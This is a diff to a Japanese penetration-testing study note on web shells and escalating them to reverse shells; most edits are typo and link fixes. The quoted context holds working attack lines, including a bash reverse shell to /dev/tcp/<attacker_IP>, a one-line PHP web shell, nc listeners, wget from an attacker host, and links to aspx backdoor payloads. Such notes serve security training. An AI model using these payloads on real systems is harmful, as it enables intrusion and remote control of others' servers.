@@ -48,7 +48,7 @@ $$WebShell実行例$$
 
 # WebShellからReverse Shellへの展開
 
-🐧Linux：WebShell上に以下のコマンドをエンコードて実行する
+🐧Linux：WebShell上に以下のコマンドをエンコードして実行する
 ```zsh
 <url>?cmd=bash -c 'bash -i >& /dev/tcp/<attacker_IP>/443 0>&1'
 ```
@@ -70,8 +70,8 @@ sudo nc -lvnp 4444
 - SYNパケットのみ届く場合は、ポート番号が誤っている
 
 > [!INFO]
-> - Kali にはデフォルトで`/usr/share/WebShells`にプログラム言語ごとにさまざまなリバースシェルペイロードが用意されている。
-> - [Reverse Shell Generator](https://www.revshells.com/)を使うと、環境に合わせたペイロードが生成できる。
+> - Kali にはデフォルトで`/usr/share/WebShells`にプログラム言語ごとにさまざまなリバースシェルペイロードが用意されている
+> - [Reverse Shell Generator](https://www.revshells.com/)を使うと、環境に合わせたペイロードが生成できる
 
 ---
 
@@ -83,10 +83,10 @@ sudo nc -lvnp 4444
 	- →シンプルなWebShellを使用：`<?php echo system($_GET["cmd"]); ?>`
 
 - PHPなどの言語固有のリバースシェルペイロードは、Unixベースのターゲット向けに書かれていることに注意
-	-→ これらは、デフォルトでは<u>Windowsで動作しない</u>ため、[Reverse Shell Generator](https://www.revshells.com/)でシェルをcmdやpowershellでペイロードを生成する
+	- → これらは、デフォルトでは<u>Windowsで動作しない</u>ため、🔗[Reverse Shell Generator](https://www.revshells.com/)でシェルをcmdやpowershellでペイロードを生成する
 
 - Webアプリケーションにペイロードをアップロードできても、phpでは、`shell_exec`の無効化などにより、`?cmd=id`などが実行できないことがある
-	- →[WebShell](#トラブルシューティング)
+	- →[トラブルシューティングl](#トラブルシューティング)
 
 ## 💡Tip
 
@@ -396,7 +396,7 @@ echo "Public key added successfully!";
 - ASP.NET Frameworkは、`.aspx`ファイルが動作するため、==WebShellのアップロード先として有効==
 
 - ASP.NET Core以降は、通常は以下の階層に公開用ファイルが生成されるが、<u>aspxファイルは動作しないため無効</u>
-	- たとえばアップロードした aspx ファイルにはアクセスできないが、.txtファイルなどのファイル形式ならアクセス可能という場合、ASP.NET Core以降と推定できる
+	- たとえば、アップロードした aspx ファイルにはアクセスできないが、.txtファイルなどのファイル形式ならアクセス可能という場合、ASP.NET Core以降と推定できる
 ```sh
 # 具体例：/umbraco/bin/Debug/net6.0/publish
 <プロジェクト名>/bin/[Debug | Release]/<.NETバージョン>/publish/
@@ -421,7 +421,7 @@ echo "Public key added successfully!";
 
 #### WebShell 
 
-- Payload：[cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)（`/use/share/webshells/aspx/cmd.aspx`）
+- Payload：🔗[cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)（`/use/share/webshells/aspx/cmd.aspx`）
 - 実行例
 ```
 http://target/shell.aspx
@@ -554,7 +554,7 @@ wget <attacker_ip>/test.txt
 
 #### ターゲット側のコマンド制限
 
-- 通常の `nc` が使えないケースがあるため`busybox`などとあわせて使う（そのほか、[revshell generator](https://www.revshells.com/)から別の手段を試す）
+- 通常の `nc` が使えないケースがあるため`busybox`などとあわせて使う（そのほか、🔗[Reverse Shell Generator](https://www.revshells.com/)から別の手段を試す）
 
 #### WebShell 実行関数の制限
 
@@ -570,5 +570,5 @@ wget <attacker_ip>/test.txt
 	- `popen`
 	- `proc_open`
 
-- 実行できないときは、攻撃ベクターを[WebShell](#File読み取り)に切り替える
+- 実行できないときは、攻撃ベクターを[File読み取り](#File読み取り)に切り替える
 
